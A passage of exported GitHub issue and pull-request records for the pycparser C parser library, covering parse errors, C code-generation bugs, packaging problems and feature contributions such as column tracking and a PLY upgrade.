  File ""/usr/lib/python2.7/dist-packages/pycparser/plyparser.py"", line 54, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/lib/gcc/x86_64-linux-gnu/4.9/include/stdarg.h:40:27: before: __gnuc_va_list

```
What's wrong?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/179/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/179/comments,https://api.github.com/repos/eliben/pycparser/issues/179/events,https://github.com/eliben/pycparser/issues/179,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/178,213111203,MDExOlB1bGxSZXF1ZXN0MTA5OTY2NzMw,178,Add column support in c_parser,9433661,closed,FALSE,NA,NA,2,2017-03-09T17:35:47Z,2017-03-10T14:14:21Z,2017-03-10T14:02:00Z,CONTRIBUTOR,NA,"Hi!

This PR adds the support of `coord.column` in the ast parser.

It's inspired from the #92, by @bbejot. The main difference is that it only
fixes the missing `column`: it doesn't not add the `end_lineno` nor the
`end_column`.

Note: As the `_coord` function is not really used any more (only two calls remaining),
tell me if you prefer removing it in favour of `._token_coord`.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/178/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/178/comments,https://api.github.com/repos/eliben/pycparser/issues/178/events,https://github.com/eliben/pycparser/pull/178,https://api.github.com/repos/eliben/pycparser/pulls/178
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/177,211341552,MDExOlB1bGxSZXF1ZXN0MTA4NzIzMTEw,177,Python 3.6 invalid escape sequence deprecation fixes,109152,closed,FALSE,NA,NA,1,2017-03-02T09:56:19Z,2017-03-05T14:15:12Z,2017-03-05T02:52:22Z,CONTRIBUTOR,NA,https://docs.python.org/3/whatsnew/3.6.html#deprecated-python-behavior,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/177/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/177/comments,https://api.github.com/repos/eliben/pycparser/issues/177/events,https://github.com/eliben/pycparser/pull/177,https://api.github.com/repos/eliben/pycparser/pulls/177
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/176,211034673,MDU6SXNzdWUyMTEwMzQ2NzM=,176,Bug in C emission of CompoundLiteral,17729021,closed,FALSE,NA,NA,5,2017-03-01T10:11:00Z,2019-08-26T22:15:43Z,2019-08-26T22:15:43Z,NONE,NA,"I have a c code that contains a compound literal, for example:
`char **foo = (char *[]) { ""x"", ""y"", ""z"" };`
pycparser parses this line correctly but when emitting a c code from the AST, the brackets are omitted and I get:
`char **foo = char *[]""x"", ""y"", ""z"";`",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/176/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/176/comments,https://api.github.com/repos/eliben/pycparser/issues/176/events,https://github.com/eliben/pycparser/issues/176,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/175,210505815,MDU6SXNzdWUyMTA1MDU4MTU=,175,Request for upgrading PLY to 3.10,16802795,closed,FALSE,NA,NA,3,2017-02-27T14:52:00Z,2017-04-03T16:36:02Z,2017-04-03T13:42:49Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/175/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/175/comments,https://api.github.com/repos/eliben/pycparser/issues/175/events,https://github.com/eliben/pycparser/issues/175,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/174,209739873,MDExOlB1bGxSZXF1ZXN0MTA3NjA4Nzcz,174,Add support for expanding struct and typedef -- Issue 93,13807244,closed,FALSE,NA,NA,0,2017-02-23T11:48:53Z,2017-02-26T13:56:44Z,2017-02-26T13:56:44Z,CONTRIBUTOR,NA,"Add optional arguments to expand `struct` and `typedef` for issue #93,  some examples here:
```python
s1 = 'typedef int Node; const Node* (*ar)[10];'
print(cdecl.explain_c_declaration(s1))
print(cdecl.explain_c_declaration(s1, expand_typedef=True))
# ar is a pointer to array[10] of pointer to const Node
# ar is a pointer to array[10] of pointer to const int

s2 = """"""
struct point {
  int x;
  int y;
};

struct rect {
  struct point pt1;
  struct point pt2;
} r;
""""""
print(cdecl.explain_c_declaration(s2))
print(cdecl.explain_c_declaration(s2, expand_struct=True))

# r is a struct rect 
# r is a struct rect containing {pt1 is a struct point containing {x is a int, y is a int}, pt2 is a struct point containing {x is a int, y is a int}}

s3 = """"""
typedef struct {
  int x;
  int y;
} point;

struct rect {
  point pt1;
  point pt2;
} r;
""""""
print(cdecl.explain_c_declaration(s3))
print(cdecl.explain_c_declaration(s3, expand_struct=True))
print(cdecl.explain_c_declaration(s3, expand_struct=True, expand_typedef=True))

# r is a struct rect 
# r is a struct rect containing {pt1 is a point, pt2 is a point}
# r is a struct rect containing {pt1 is a struct containing {x is a int, y is a int}, pt2 is a struct containing {x is a int, y is a int}}

s4 = 'struct P {int x; int y;} p;'
print(cdecl.explain_c_declaration(s4))
# p is a struct P containing {x is a int, y is a int}
```",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/174/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/174/comments,https://api.github.com/repos/eliben/pycparser/issues/174/events,https://github.com/eliben/pycparser/pull/174,https://api.github.com/repos/eliben/pycparser/pulls/174
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/173,209059411,MDU6SXNzdWUyMDkwNTk0MTE=,173,How general is pycparser?,17729021,closed,FALSE,NA,NA,4,2017-02-21T07:07:52Z,2017-02-24T04:31:02Z,2017-02-24T04:31:02Z,NONE,NA,"In a project I work on, I want to use pycparser to manipulate c code. The manipulation shouldn't change the functionality and compileabilty of the code.
I wish to build a tool that receives a c file and - using pycparser -  outputs a manipulated version of it. I want the tool to be very general and automatic an be able to work properly for as many c files as possible.

In one of the closed issues about conflict between the typedefs of the fake_libs and the real ones, someone asked:

So is it wrong to expect pycparser's output to be compileable, and running just as the initial c code?

And the answer was:

Yes, pycparser can lose information -- especially about the types. You can achieve full end-to-end transform and compile with some effort, but it's not something promised out of the box
-------
I'm now concerned that maybe pycparser is not general enough and therefore is not the good tool for my project. Can you please elaborate what information can be lost during c2c  process and what ""effort"" we should do to achieve full end-to-end transform?

Many thanks!
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/173/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/173/comments,https://api.github.com/repos/eliben/pycparser/issues/173/events,https://github.com/eliben/pycparser/issues/173,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/172,208792219,MDExOlB1bGxSZXF1ZXN0MTA2OTQ1MjIx,172,Add example of serializing AST for #82,13807244,closed,FALSE,NA,NA,1,2017-02-20T06:12:35Z,2017-02-22T04:10:37Z,2017-02-22T04:10:37Z,CONTRIBUTOR,NA,"For issue #82, It's possible to serializing AST nodes now.  

From documentation:

> There are currently 5 different protocols which can be used for pickling. The higher the protocol used, the more recent the version of Python needed to read the pickle produced.

Using `__slots__ `without implementing `__getstate__` and `__setstate__` needs a protocol version >= 2. The default version is 3 for python 3.x and 1 for python 2.7. While version 2 is available since python 2.3.

So actually it's a solved problem and I added a simple example.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/172/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/172/comments,https://api.github.com/repos/eliben/pycparser/issues/172/events,https://github.com/eliben/pycparser/pull/172,https://api.github.com/repos/eliben/pycparser/pulls/172
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/171,208717113,MDExOlB1bGxSZXF1ZXN0MTA2OTAwOTM0,171,Fix comment typo,13807244,closed,FALSE,NA,NA,1,2017-02-19T13:22:11Z,2017-02-19T17:30:48Z,2017-02-19T17:30:43Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/171/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/171/comments,https://api.github.com/repos/eliben/pycparser/issues/171/events,https://github.com/eliben/pycparser/pull/171,https://api.github.com/repos/eliben/pycparser/pulls/171
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/170,208163395,MDU6SXNzdWUyMDgxNjMzOTU=,170,AttributeError: type object 'IdentifierType' has no attribute '__slots__',25823961,closed,FALSE,NA,NA,2,2017-02-16T15:58:25Z,2017-02-16T17:32:15Z,2017-02-16T17:32:15Z,NONE,NA,"Hello Eli,
I might be misusing the pycparser, so pls let me know if this is indeed the case.
I have a C-header file with few ""typedef struct"" definitions and i want to convert the structs to jsons.
I tried using examples\c_json.py on my header file and got the error:
    AttributeError: type object 'IdentifierType' has no attribute '__slots__'

Then I tried to run c_json on few c files in examples dir and for few of them i got the same error, e.g.:
```
C:\Users\Eugene\Documents\pycparser-master>python examples\c_json.py tests\c_files\memmgr_with_h.c
Traceback (most recent call last):
  File ""examples\c_json.py"", line 199, in <module>
    ast_dict = file_to_dict(sys.argv[1])
  File ""examples\c_json.py"", line 133, in file_to_dict
    return to_dict(ast)
  File ""examples\c_json.py"", line 113, in to_dict
    result[array_name].append(to_dict(child))
  File ""examples\c_json.py"", line 115, in to_dict
    result[child_name] = to_dict(child)
  File ""examples\c_json.py"", line 115, in to_dict
    result[child_name] = to_dict(child)
  File ""examples\c_json.py"", line 118, in to_dict
    for child_attr in child_attrs_of(klass):
  File ""examples\c_json.py"", line 64, in __missing__
    ret = self[key] = fn(key)
  File ""examples\c_json.py"", line 77, in child_attrs_of
    all_attrs = set([i for i in klass.__slots__ if not RE_INTERNAL_ATTR.match(i)])
AttributeError: type object 'IdentifierType' has no attribute '__slots__'

C:\Users\Eugene\Documents\pycparser-master>python examples\c_json.py tests\c_files\example_c_file.c
Traceback (most recent call last):
  File ""examples\c_json.py"", line 199, in <module>
    ast_dict = file_to_dict(sys.argv[1])
  File ""examples\c_json.py"", line 133, in file_to_dict
    return to_dict(ast)
  File ""examples\c_json.py"", line 113, in to_dict
    result[array_name].append(to_dict(child))
  File ""examples\c_json.py"", line 115, in to_dict
    result[child_name] = to_dict(child)
  File ""examples\c_json.py"", line 115, in to_dict
    result[child_name] = to_dict(child)
  File ""examples\c_json.py"", line 118, in to_dict
    for child_attr in child_attrs_of(klass):
  File ""examples\c_json.py"", line 64, in __missing__
    ret = self[key] = fn(key)
  File ""examples\c_json.py"", line 77, in child_attrs_of
    all_attrs = set([i for i in klass.__slots__ if not RE_INTERNAL_ATTR.match(i)])
AttributeError: type object 'IdentifierType' has no attribute '__slots__'
```

My system is Win7, 64-bit, Python 2.7.12.

Pls advise.
Thanks,
  Eugene",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/170/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/170/comments,https://api.github.com/repos/eliben/pycparser/issues/170/events,https://github.com/eliben/pycparser/issues/170,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/169,207960428,MDExOlB1bGxSZXF1ZXN0MTA2NDIxODM2,169,Fix parsing TYPEIDs in declarators,3268059,closed,FALSE,NA,NA,16,2017-02-15T23:18:50Z,2017-04-20T16:54:27Z,2017-02-22T13:54:06Z,CONTRIBUTOR,NA,"This fixes the parsing of TYPEIDs in declarators (and related expressions) once and for all, removing existing workarounds for specific cases of the problem. In particular, it solves the problem in the current parser where a TYPEID is used in a list of multiple declarators, for which there is no workaround.

All tests are passing for me, and I added 2 more tests related to parsing declarators correctly.

I've tried to organize the commits as logically and discretely as possible to make it clear what is happening in each step:

1. Remove workaround productions
2. Allow TYPEIDs in declarators
3. Restrict `declaration-specifiers` and `specifier-qualifier-list` to contain at least one type-specifier, and only one if it is a `typedef-name`
4. Force `parameter-declaration`s to interpret a TYPEID as a `typedef-name` in cases of ambiguity

It is likely there is some more leftover ""workaround"" code that can removed, but I decided it was best to do the PR as-is for now, as that may take some careful thought (and maybe more tests to ensure no change in behavior).
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/169/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/169/comments,https://api.github.com/repos/eliben/pycparser/issues/169/events,https://github.com/eliben/pycparser/pull/169,https://api.github.com/repos/eliben/pycparser/pulls/169
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/168,207895233,MDU6SXNzdWUyMDc4OTUyMzM=,168,cx_Freeze packaging error: could not get source code,1345878,closed,FALSE,NA,NA,3,2017-02-15T18:56:46Z,2017-02-15T19:37:34Z,2017-02-15T19:37:34Z,NONE,NA,"Hi,

I encountered a major issue packaging FFI, which is using pycparser, in one of my projects. It seems that pycparser requires the inspect module to do some fancy AST work, but since cx_Freeze doesn't pack any .py-files to analyze inspect will fail and the whole program doesn't actually finish loading at all.

That's the traceback, using Python 2.7.12 x86 under Windows 10 x64:

Traceback (most recent call last):
  File ""C:\Python27\lib\site-packages\cx_Freeze\initscripts\Console.py"", 
line 27, in <module>
    exec(code, m.__dict__)
  File ""collisioninspace.py"", line 1, in <module>
  File ""F:\Privat\Skripte\Collision In Space\lib\__init__.py"", line 1, in 
<module>
    from .main import *
  File ""F:\Privat\Skripte\Collision In Space\lib\main.py"", line 6, in 
<module>
    from .environment import *
  File ""F:\Privat\Skripte\Collision In Space\lib\environment.py"", line 5, in 
<module>
    import soundbank
  File ""F:\Privat\Skripte\Collision In Space\lib\soundbank.py"", line 7, in 
<module>
    from sound import *
  File ""F:\Privat\Skripte\Collision In Space\lib\sound.py"", line 5, in 
<module>
    import soundfile
  File ""C:\Python27\lib\site-packages\soundfile.py"", line 145, in 
<module>
    """""")
  File ""C:\Python27\lib\site-packages\cffi\api.py"", line 105, in cdef
    self._cdef(csource, override=override, packed=packed)
  File ""C:\Python27\lib\site-packages\cffi\api.py"", line 119, in _cdef
    self._parser.parse(csource, override=override, **options)
  File ""C:\Python27\lib\site-packages\cffi\cparser.py"", line 299, in parse
    self._internal_parse(csource)
  File ""C:\Python27\lib\site-packages\cffi\cparser.py"", line 304, in 
_internal_parse
    ast, macros, csource = self._parse(csource)
  File ""C:\Python27\lib\site-packages\cffi\cparser.py"", line 260, in _parse
    ast = _get_parser().parse(csource)
  File ""C:\Python27\lib\site-packages\cffi\cparser.py"", line 40, in 
_get_parser
    _parser_cache = pycparser.CParser()
  File ""C:\Python27\lib\site-packages\pycparser\c_parser.py"", line 116, in
__init__
    outputdir=taboutputdir)
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 3293, 
in yacc
    if pinfo.validate_all():
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 2938, 
in validate_all
    self.validate_modules()
  File ""C:\Python27\lib\site-packages\pycparser\ply\yacc.py"", line 2982, 
in validate_modules
    lines, linen = inspect.getsourcelines(module)
  File ""C:\Python27\lib\inspect.py"", line 690, in getsourcelines
    lines, lnum = findsource(object)
  File ""C:\Python27\lib\inspect.py"", line 538, in findsource
    raise IOError('could not get source code')
IOError: could not get source code

Is inspect actually needed to parse the C code, or is it just needed for some special things which FFI actually doesn't need in most cases, so that the importing commands can be excepted and the functionality limited for packaged applications, or anything else?

Do you have some ideas, maybe even some things to forward to the cx_Freeze developers so that this problem can be solved all together?

Best Regards.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/168/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/168/comments,https://api.github.com/repos/eliben/pycparser/issues/168/events,https://github.com/eliben/pycparser/issues/168,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/167,207848069,MDU6SXNzdWUyMDc4NDgwNjk=,167,Parsing C headers comments,9632888,closed,FALSE,NA,NA,2,2017-02-15T16:07:00Z,2017-02-15T16:23:38Z,2017-02-15T16:19:20Z,NONE,NA,"Hello!
Is it possible to parse C headers comments with pacparser?
Thanks in advance!",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/167/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/167/comments,https://api.github.com/repos/eliben/pycparser/issues/167/events,https://github.com/eliben/pycparser/issues/167,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/166,205983260,MDU6SXNzdWUyMDU5ODMyNjA=,166,JS port?,7414255,closed,FALSE,NA,NA,3,2017-02-07T19:03:27Z,2017-02-08T17:21:21Z,2017-02-07T21:28:21Z,NONE,NA,"Beautiful piece of code. Any plan to port it on JS? :)
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/166/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/166/comments,https://api.github.com/repos/eliben/pycparser/issues/166/events,https://github.com/eliben/pycparser/issues/166,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/165,205689288,MDU6SXNzdWUyMDU2ODkyODg=,165,Using pycparser as a submodule?,1880105,closed,FALSE,NA,NA,2,2017-02-06T19:51:14Z,2017-02-07T03:53:13Z,2017-02-07T03:53:13Z,NONE,NA,"This is more of a question than an issue --
I'm wondering if the scenario of using pycparser in another project as a git submodule (without installing anything) is ""officialy"" supported, or whether I should expect things to break with future versions.

In general, submodules are preferred to installed libraries, because they are self-contained and behave more consistently (for starters, you know exactly which version the user is going to get)

Thanks.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/165/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/165/comments,https://api.github.com/repos/eliben/pycparser/issues/165/events,https://github.com/eliben/pycparser/issues/165,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/164,205423036,MDU6SXNzdWUyMDU0MjMwMzY=,164,Parser's wrong interpretation of expression containing {0} and casting,17729021,closed,FALSE,NA,NA,8,2017-02-05T12:47:01Z,2017-04-05T13:27:09Z,2017-04-05T13:27:09Z,NONE,NA,"when parsing the following line:
**void* ptr = (int[ ]){0};**

The parser doesn't interpret it correctly (doesn't identify the casting and doesn't understand the initialization of new array) and create the following AST node for it:

Decl: ptr, [], [], []
        PtrDecl: []
          TypeDecl: ptr, []
            IdentifierType: ['void']
        CompoundLiteral: 
          Typename: None, []
            ArrayDecl: []
              TypeDecl: None, []
                IdentifierType: ['int']
          InitList: 
            Constant: int, 0

When re-generating c code from this AST, I get the following
**void *ptr = int []0;**
which, obviously, doesn't compile.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/164/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/164/comments,https://api.github.com/repos/eliben/pycparser/issues/164/events,https://github.com/eliben/pycparser/issues/164,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/163,203983014,MDExOlB1bGxSZXF1ZXN0MTAzNzE2NzY0,163,dump and load as json,5246528,closed,FALSE,NA,NA,6,2017-01-30T11:17:31Z,2017-02-03T04:02:21Z,2017-02-03T04:02:21Z,CONTRIBUTOR,NA,"In the examples folder, I implemented this feature:

https://github.com/eliben/pycparser/issues/67

And also its reverse.

The consistency of your ast node code made this quite straightforward, and I was able to implement it without modifying any core code. I abused __slots__ slightly in order to discover all constructor fields of each node class (empty child fields do not show up in children() calls, so they do not get serialized). This could be avoided by adding ""=None"" defaults to all node constructor arguments that represent child fields.

I've manually tested this on some of the example c files (I'm having preprocessor integration issues which make it difficult to test more thoroughly), but I should probably add some automated tests.

This is a really neat project by the way - I'm interested in using it as part of implementing a compiler for a very C-like language.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/163/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/163/comments,https://api.github.com/repos/eliben/pycparser/issues/163/events,https://github.com/eliben/pycparser/pull/163,https://api.github.com/repos/eliben/pycparser/pulls/163
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/162,203827143,MDU6SXNzdWUyMDM4MjcxNDM=,162,when pycparser is parsing clang got an error,7870949,closed,FALSE,NA,NA,4,2017-01-28T19:49:13Z,2017-02-13T02:36:06Z,2017-01-29T03:59:07Z,NONE,NA,"```
File ""tools/geninterop/geninterop.py"", line 278, in main
        ast = parser.parse(python_h)
      File ""/home/dta/anaconda3/lib/python3.5/site-packages/pycparser/c_parser.py"", line 146, in parse
        debug=debuglevel)
      File ""/home/dta/anaconda3/lib/python3.5/site-packages/pycparser/ply/yacc.py"", line 265, in parse
        return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
      File ""/home/dta/anaconda3/lib/python3.5/site-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
        tok = self.errorfunc(errtoken)
      File ""/home/dta/anaconda3/lib/python3.5/site-packages/pycparser/c_parser.py"", line 1680, in p_error
        column=self.clex.find_tok_column(p)))
      File ""/home/dta/anaconda3/lib/python3.5/site-packages/pycparser/plyparser.py"", line 55, in _parse_error
        raise ParseError(""%s: %s"" % (coord, msg))
    pycparser.plyparser.ParseError: /usr/bin/../lib/clang/3.4/include/stdarg.h:30:27: before: va_list
    Traceback (most recent call last):
```

Originally posted here:

https://github.com/pythonnet/pythonnet/issues/336
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/162/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/162/comments,https://api.github.com/repos/eliben/pycparser/issues/162/events,https://github.com/eliben/pycparser/issues/162,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/161,203025603,MDExOlB1bGxSZXF1ZXN0MTAzMDY0Mjg2,161,Merge upstream PLY 3.9 into pycparser tree.,647785,closed,FALSE,NA,NA,2,2017-01-25T06:47:06Z,2017-01-28T15:03:34Z,2017-01-28T15:03:34Z,CONTRIBUTOR,NA,This updates PLY to the latest upstream code. Fixes Issue #160.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/161/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/161/comments,https://api.github.com/repos/eliben/pycparser/issues/161/events,https://github.com/eliben/pycparser/pull/161,https://api.github.com/repos/eliben/pycparser/pulls/161
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/160,203015051,MDU6SXNzdWUyMDMwMTUwNTE=,160,Please Update PLY Dependency to 3.9,647785,closed,FALSE,NA,NA,1,2017-01-25T05:17:10Z,2017-01-28T15:09:22Z,2017-01-28T15:09:22Z,CONTRIBUTOR,NA,"I recently wrote a long bug report to the `sounddevice` team, who passed the buck to `CFFI`, whose developers implicated `pycparser` or `ply`. After lots of digging, I found a bug in PLY which prevented its use in a zipped-up source-less distributable as created by `py2app` or `pyinstaller`. After smugly filing a bug report with the PLY project, I checked out their upstream source so I could submit a PR only to find that... my bug had already been fixed!

It turns out that `pycparser` includes a *copy* of PLY 3.8 in your source tree, while PLY 3.9 is (currently) the latest release. 

Might I humbly request that you consider updating your packaged version of PLY to 3.9? I am sorry to say that `pycparser` is sufficiently over my head that I don't feel comfortable attempting a PR myself, so allow me to simply offer sincere THANKS!

See also:
https://github.com/spatialaudio/python-sounddevice/issues/68
https://groups.google.com/forum/#!topic/python-cffi/4JM22wGhVr4
https://github.com/dabeaz/ply/issues/108",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/160/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/160/comments,https://api.github.com/repos/eliben/pycparser/issues/160/events,https://github.com/eliben/pycparser/issues/160,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/159,200798287,MDExOlB1bGxSZXF1ZXN0MTAxNTU4ODQ5,159,Add argument to CParser.__init__ for overriding the yacc start symbol.,8070849,closed,FALSE,NA,NA,5,2017-01-14T11:38:13Z,2017-02-03T04:16:59Z,2017-01-15T17:54:17Z,CONTRIBUTOR,NA,This has been very useful for me to be able to parse e.g. expressions directly.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/159/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/159/comments,https://api.github.com/repos/eliben/pycparser/issues/159/events,https://github.com/eliben/pycparser/pull/159,https://api.github.com/repos/eliben/pycparser/pulls/159
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/158,200385522,MDExOlB1bGxSZXF1ZXN0MTAxMjcyNDQx,158,Add support for the __int128 type.,8070849,closed,FALSE,NA,NA,1,2017-01-12T14:47:34Z,2017-01-13T13:17:00Z,2017-01-13T13:16:55Z,CONTRIBUTOR,NA,"This type is not part of the core C99 or C11 standards, but is mentioned
in both documents under ""Common extensions"".",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/158/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/158/comments,https://api.github.com/repos/eliben/pycparser/issues/158/events,https://github.com/eliben/pycparser/pull/158,https://api.github.com/repos/eliben/pycparser/pulls/158
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/157,199668784,MDU6SXNzdWUxOTk2Njg3ODQ=,157,"pip install misses ""fake_libc_include"" directory",1824582,closed,FALSE,NA,NA,5,2017-01-09T21:36:55Z,2017-01-12T17:50:12Z,2017-01-11T13:36:05Z,NONE,NA,"I've followed the installation instructions by doing:
`sudo pip install pycparser`
on a Ubuntu 14.04 machine, and pycparser version 2.17 gets correctly installed but the installation is completely missing the ""fake_libc_include"" directory.
I expected that this directory would be installed as the documentation seems to assume that this will be the case.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/157/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/157/comments,https://api.github.com/repos/eliben/pycparser/issues/157/events,https://github.com/eliben/pycparser/issues/157,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/156,196528331,MDExOlB1bGxSZXF1ZXN0OTg2NDU1MTM=,156,"parse_text, preprocess_text added",226247,closed,FALSE,NA,NA,2,2016-12-19T21:44:52Z,2016-12-21T21:54:47Z,2016-12-20T13:53:15Z,NONE,NA,"As the name suggests, these are two convenience functions that make unit-testing my code working with the resulting AST easier (at least for me). 

It would also be possible to make the ```parse_file()``` and ```preprocess_file()``` functions invoke ```parse_text()``` and ```preprocess_file()``` respectively. However, this would change the behavior of this library as the CPP would be forced to always read from stdin.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/156/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/156/comments,https://api.github.com/repos/eliben/pycparser/issues/156/events,https://github.com/eliben/pycparser/pull/156,https://api.github.com/repos/eliben/pycparser/pulls/156
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/155,188602500,MDExOlB1bGxSZXF1ZXN0OTMyMTg5NjM=,155,using with...: in subprocess.Popen(),7014360,closed,FALSE,NA,NA,3,2016-11-10T19:53:48Z,2016-11-11T13:32:31Z,2016-11-11T13:32:31Z,NONE,NA,"To be (a little ) more robust with sub processes.

",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/155/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/155/comments,https://api.github.com/repos/eliben/pycparser/issues/155/events,https://github.com/eliben/pycparser/pull/155,https://api.github.com/repos/eliben/pycparser/pulls/155
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/154,184711440,MDU6SXNzdWUxODQ3MTE0NDA=,154,Wrong file permissions?,21270245,closed,FALSE,NA,NA,17,2016-10-23T19:54:36Z,2016-11-02T19:36:53Z,2016-11-02T19:36:53Z,NONE,NA,"Is it intentional, that files in the 2.16 release are not world readable?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/154/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/154/comments,https://api.github.com/repos/eliben/pycparser/issues/154/events,https://github.com/eliben/pycparser/issues/154,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/153,183709780,MDU6SXNzdWUxODM3MDk3ODA=,153,Missing git tag for 2.15 release,1006477,closed,FALSE,NA,NA,1,2016-10-18T14:52:19Z,2016-10-18T15:06:12Z,2016-10-18T15:06:12Z,NONE,NA,"It would be nice to keep PyPI releases and git tags in sync :)
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/153/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/153/comments,https://api.github.com/repos/eliben/pycparser/issues/153/events,https://github.com/eliben/pycparser/issues/153,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/152,183702326,MDU6SXNzdWUxODM3MDIzMjY=,152,"AssertionError: sorry, but this version only supports 100 named groups",244702,closed,FALSE,NA,NA,2,2016-10-18T14:26:17Z,2016-10-18T16:29:20Z,2016-10-18T16:29:20Z,NONE,NA,"Hello,

This has already been reported .  but it happens w/ cffi

Thanks

Carlos

File ""/home/ntiuser-outest/buildout/eggs/cffi-1.8.3-py2.7-linux-x86_64.egg/cffi/api.py"", line 105, in cdef
    self._cdef(csource, override=override, packed=packed)
  File ""/home/ntiuser-outest/buildout/eggs/cffi-1.8.3-py2.7-linux-x86_64.egg/cffi/api.py"", line 119, in _cdef
    self._parser.parse(csource, override=override, **options)
  File ""/home/ntiuser-outest/buildout/eggs/cffi-1.8.3-py2.7-linux-x86_64.egg/cffi/cparser.py"", line 299, in parse
    self._internal_parse(csource)
